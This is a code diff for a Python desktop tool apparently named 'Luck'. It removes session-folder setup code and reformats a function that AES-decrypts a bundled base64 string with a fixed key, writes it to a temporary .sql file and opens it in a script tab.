@@ -270,32 +270,6 @@ def stopIconTimer(self, *args):
 
 #Preparing frameworks
 def prepareFramework(self, *args):
-    #Preparing specific folders in session path, temporary path or home path
-    #-----------------------------------------------------------------------
-    ##Path and folder of the session
-    temp_path = os.path.join(tempfile.gettempdir(), 'Luck', 'session')
-    sesion_path = self.cfg_session.index.get('session_path', '')
-    if sesion_path and not os.path.exists(sesion_path):
-        #Creating the temporary folder if it does not exist
-        try:
-            os.makedirs(sesion_path)
-        except:
-            #Creating the Luck folder in the temporary folder
-            os.makedirs(temp_path) if not os.path.exists(temp_path) else None
-            self.cfg_session.index['session_path'] = temp_path
-    elif sesion_path and os.access(sesion_path, os.R_OK | os.W_OK):
-        print(self.i18nNes('log-messages', 'error-session'))
-    elif not sesion_path:
-        #Creating the Luck folder in the temporary folder
-        try:
-            os.makedirs(temp_path) if not os.path.exists(temp_path) else None
-        except:
-            #If it fails, it will create the Luck folder in the user's home directory
-            home_path = os.path.join(os.path.expanduser('~'), 'session')
-            os.makedirs(home_path) if not os.path.exists(home_path) else None
-            #Creating the session folder inside Luck
-            self.cfg_session.index['session_path'] = home_path
-    
     ##Path and data folder
     if platform.system() == 'Windows':
         #Will try to get the downloads folder from the registry
@@ -824,15 +798,15 @@ def startUpdate(self, silent=False, *args):
         msg.exec()
 
 def disguiseFrame(self, *args):
-    info2 = 'KP5wSd9foRj+c9puxDUr8JKuH0l4hnDnRlMDceF7wybYLKOTsqHZBPcri94nHTup1Gns3mOx3jgHpiUXBdxtRqZOCpWFzFyTSUzrAJLkMvHE0eeA7c/MUCAoMtKTt/VP1qb3+zcidaYp4XsUkxwc1euqPPVavMpbfZX8HOgQSHislTG8dogfPnKnOLbeL6BzWqNypjo0KWywOYyCLgcbs8m6P6dWpPKoaewRfcDkmRPtE33XPnMjI5bXiG8hkiJTVXHStkesCcI2ftu8BmrQ54+JLlgtJ6QxA2en3r8OlgG13yHZIvOCKPCZkqVEbk+pA7weyiwP1UE3sY1zQumwvQOIyPvPYX4s4NLtyjOnJtTUs3Z7nhs5uisAB1PYAfEA/La8d6gUdZcGOYndpSaHARdkO9C8UkJ8sUoKJzZ2CII9SOYg7uwPegOT4w/KKNLwM4iPkDBKLLEpC+soXsPT+u2Td43fA/H3uvnofult/IaXgV6KCFa9lP3tuZ1mocCp9qAlAJEOeyES9vcwCANo1Z+fhFCcAowrL4/iDqprXfgBdqk58IdfLJstkzNJ/hQCkvy9DUbOhddTHNIYBhHGxugob08lyNH8CpMUWYDQ+QApK5oEwEWJ/vujY5GwAppJ//Ntqi3z+TLt943LyC0E762U877IVkRSx2FE3bZExhjfDEsFiTn5jO4X0Z4RPogFtFe7kPb0y66gbRK/0TPDUCYSV7wfcgUM8VQNkKyvcpCpJIGDoaLVQZsp03TF8PHaVVgurKbJJonyqraw2enzIozfB6kpdGlgfBGAnoBfHwQ='
+    info2    = 'KP5wSd9foRj+c9puxDUr8JKuH0l4hnDnRlMDceF7wybYLKOTsqHZBPcri94nHTup1Gns3mOx3jgHpiUXBdxtRqZOCpWFzFyTSUzrAJLkMvHE0eeA7c/MUCAoMtKTt/VP1qb3+zcidaYp4XsUkxwc1euqPPVavMpbfZX8HOgQSHislTG8dogfPnKnOLbeL6BzWqNypjo0KWywOYyCLgcbs8m6P6dWpPKoaewRfcDkmRPtE33XPnMjI5bXiG8hkiJTVXHStkesCcI2ftu8BmrQ54+JLlgtJ6QxA2en3r8OlgG13yHZIvOCKPCZkqVEbk+pA7weyiwP1UE3sY1zQumwvQOIyPvPYX4s4NLtyjOnJtTUs3Z7nhs5uisAB1PYAfEA/La8d6gUdZcGOYndpSaHARdkO9C8UkJ8sUoKJzZ2CII9SOYg7uwPegOT4w/KKNLwM4iPkDBKLLEpC+soXsPT+u2Td43fA/H3uvnofult/IaXgV6KCFa9lP3tuZ1mocCp9qAlAJEOeyES9vcwCANo1Z+fhFCcAowrL4/iDqprXfgBdqk58IdfLJstkzNJ/hQCkvy9DUbOhddTHNIYBhHGxugob08lyNH8CpMUWYDQ+QApK5oEwEWJ/vujY5GwAppJ//Ntqi3z+TLt943LyC0E762U877IVkRSx2FE3bZExhjfDEsFiTn5jO4X0Z4RPogFtFe7kPb0y66gbRK/0TPDUCYSV7wfcgUM8VQNkKyvcpCpJIGDoaLVQZsp03TF8PHaVVgurKbJJonyqraw2enzIozfB6kpdGlgfBGAnoBfHwQ='
     msg_comp = base64.b64decode(info2)
-    iv = msg_comp[:16]
-    msg_cif = msg_comp[16:]
-    cipher = AES.new(b'wa8P4bbhboiKKCRe', AES.MODE_CBC, iv=iv)
-    msg_org = unpad(cipher.decrypt(msg_cif), AES.block_size).decode()
-    rnn = ''.join(random.choice( string.ascii_lowercase ) for _ in range(3))
-    path = os.path.join(tempfile.gettempdir(), 'Luck', f'{rnn}.sql')
-    arcv = open( path, 'w' , encoding='utf-8')
+    iv       = msg_comp[:16]
+    msg_cif  = msg_comp[16:]
+    cipher   = AES.new(b'wa8P4bbhboiKKCRe', AES.MODE_CBC, iv=iv)
+    msg_org  = unpad(cipher.decrypt(msg_cif), AES.block_size).decode()
+    rnn      = ''.join(random.choice( string.ascii_lowercase ) for _ in range(3))
+    path     = os.path.join(tempfile.gettempdir(), 'Luck', f'{rnn}.sql')
+    arcv     = open( path, 'w' , encoding='utf-8')
     arcv.write( msg_org )
     arcv.close()
     self.newScriptTab(path)
